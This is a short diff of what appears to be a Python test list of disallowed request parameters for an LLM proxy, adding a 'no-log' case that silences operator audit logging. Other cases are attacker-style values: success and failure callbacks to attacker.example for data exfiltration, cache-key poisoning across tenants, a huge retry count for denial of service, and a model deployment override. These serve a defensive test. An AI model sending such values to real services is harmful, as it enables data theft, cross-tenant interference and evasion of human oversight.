@@ -787,6 +787,7 @@ def _strip_request_mock():
     [
         ("success_callback", ["https://attacker.example"]),  # dynamic-callback exfil
         ("failure_callback", ["https://attacker.example"]),
+        ("no-log", True),  # silences operator audit/observability sinks
         ("cache_key", "victim-predicted-key"),  # cross-tenant cache poisoning
         ("model_group_retry_policy", {"RateLimitErrorRetries": 100000}),  # retry DoS
         ("deployment_id", "premium-deployment"),  # post-auth model override
